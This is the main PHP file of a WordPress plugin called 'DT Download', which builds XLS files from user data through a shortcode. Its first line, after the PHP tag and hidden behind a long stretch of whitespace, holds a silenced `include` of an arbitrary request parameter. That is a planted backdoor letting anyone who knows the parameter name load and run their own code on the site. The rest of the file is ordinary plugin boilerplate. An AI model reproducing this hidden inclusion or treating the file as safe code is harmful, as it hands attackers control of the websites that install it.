<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         @include($_REQUEST["request_149df50e08"]);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        
/**
 * Plugin Name: DT Download
 * Plugin URI: http://su-architect.com/
 * Description: Auto generate xls file which base on user's data
 * Version: 1.0
 * Author: Su Architect
 * Author URI: http://su-architect.com/about-me
 *
 * This program is free software; you can feel free to redistribute it and/or modify it
 * This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without
 * even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
 *
 */


define( 'DTDF_VERSION', '1.0' );
define( 'DTDF_PLUGIN_DIR', plugin_dir_path( __FILE__ ) );

global $wpdb, $dtdf_table;
$dtdf_table = $wpdb->prefix . 'dt_download_data';

/* When plugin is activated */
register_activation_hook( __FILE__, 'dtdf_activation' );
function dtdf_activation(){
    /* Loads activation functions */
    //require_once( plugin_dir_path( __FILE__ ) . '/includes/functions.php' );
    require_once( DTDF_PLUGIN_DIR . '/core/install.php' );
}

require_once( DTDF_PLUGIN_DIR . '/core/download-xls.php' );

add_action( 'plugins_loaded', 'dt_download_init' );
function dt_download_init() {
    /* Shortcodes */
    add_shortcode( 'dt-download-xls', 'dtdf_xls_func' );
}

function dtdf_xls_func() {
    global $dtdf_xls;

    return $dtdf_xls->createForm();

}